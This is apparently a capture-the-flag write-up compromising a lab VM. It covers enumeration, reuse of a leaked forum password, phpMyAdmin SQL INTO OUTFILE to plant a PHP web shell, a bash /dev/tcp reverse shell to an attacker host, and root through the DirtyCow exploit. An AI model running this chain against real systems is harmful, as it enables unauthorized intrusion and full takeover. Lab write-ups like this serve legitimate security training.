## Enumeration

### ping sweep

We found the ip address of our target using ping sweep

```
$ nmap -sn 192.168.0.0/24
...
Nmap scan report for 192.168.0.6
Host is up (0.00068s latency).
...
```

### nmap scan

After identifying the target ip, we scaned it for open ports

```
$ nmap 192.168.0.6
...
21/tcp  open  ftp      vsftpd 2.0.8 or later
22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.7 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))
143/tcp open  imap     Dovecot imapd
443/tcp open  ssl/http Apache httpd 2.2.22
993/tcp open  ssl/imap Dovecot imapd
...
```

### port 80

http://192.168.0.6/ contains a static web page, nothing of interest.

### port 443

When using https, we got a 404 error, which means there is not default page.

We used `ffuf` to find hidden resources

```
$ ffuf -u https://192.168.0.6/FUZZ -w ~/wordlists/web/common.txt
...
forum                   [Status: 301, Size: 306, Words: 20, Lines: 10, Duration: 1ms]
phpmyadmin              [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 2ms]
webmail                 [Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 1ms]
...
```

#### forum

We did the same thing for `/forum` to find more resources, but nothing of interest at the moment.

```
$ ffuf -u https://192.168.0.6/forum/FUZZ -w ~/wordlists/web/common.txt
...
modules                 [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 5ms]
templates_c             [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 0ms]
themes                  [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 1ms]
update                  [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 0ms]
...
```

We found what looks like a password at https://192.168.0.6/forum/index.php?id=6: `!q\]Ej?*5K5cy*AJ`

```
curl -sk https://192.168.0.6/forum/index.php?id=6 | egrep -o 'invalid user .* from' | cut -d ' ' -f 3 | sort -u
```
We also found a list of users at https://192.168.0.6/forum/index.php?mode=user

After trying the password with different users, we were able to login as lmexard: `lmezard:!q\]Ej?*5K5cy*AJ`

In the user's profile page (https://192.168.0.6/forum/index.php?mode=user&action=edit_profile),
we found an email address

#### webmail

We used the email found at the forum `laurie@borntosec.net` with the password we had `!q\]Ej?*5K5cy*AJ`
to login to the webmail portal

In the email with the subject `DB Access`, there were credentials to access databases, we used them to
access phpmyadmin

#### phpmyadmin

Logged in using this creds `root:Fg-'kKXBj87E:aJ$`. We were able to access the forum database and extract
password hashes but we were unable to crack any of them.

As we can execute sql queries bu browsing to https://192.168.0.6/phpmyadmin/server_sql.php,
we tried creating a php script on the web server. But we had to find writable directories first.

We used the directories found after fuzzing `/forum`, and `templates_c` was writable.

As a proof of concept we used the following query to create `info.php`

```
SELECT '<?php phpinfo();?>' INTO OUTFILE '/var/www/forum/templates_c/info.php'
```

After browing to https://192.168.0.6/forum/templates_c/info.php, the php code was executed.

## Initial access

Now that we had a way to create php files on the web server, we created a script to get a reverse shell.

We executes the following query

```
SELECT '<?php system("bash -c \'bash -i >& /dev/tcp/192.168.0.5/9000 0>&1\'");?>' INTO OUTFILE '/var/www/forum/templates_c/shell.php'
```

After that, we started a listener to receive the connection

```
$ nc -lnp 9000
```

Then browsed to https://192.168.0.6/forum/templates_c/shell.php, and got a reverse shell as `www-data`.

We then used this commands to get a stable shell.

```
target$ python -c 'import pty; pty.spawn("/bin/bash")'
target$ Ctrl+Z
attack$ stty -a
speed 38400 baud; rows 53; columns 237; line = 0;
...
attack$ stty raw -echo; fg
target$ export TERM=xterm
target$ stty rows 53 columns 237
```

## Privilege escalation

Once on the machine, we checked the linux version to see if it has any known vulnerabilites.
```
$ uname -r
3.2.0-91-generic-pae
```
It was vulnerable to CVE-2016-5195 also known as 'DirtyCow'

We used the following exploit: https://github.com/firefart/dirtycow/raw/master/dirty.c

```
$ gcc -pthread dirty.c -o dirty -lcrypt
$ ./dirty password
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: password
Complete line:
firefart:fi1IpG9ta02N.:0:0:pwned:/root:/bin/bash

mmap: b7fda000
madvise 0

ptrace 0
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password 'password'.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password 'password'.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
```
And finally logged in used the provided credentials: `firefart:password`
```
$ su firefart
Password:
firefart@BornToSecHackMe:/home/laurie# id
uid=0(firefart) gid=0(root) groups=0(root)
```
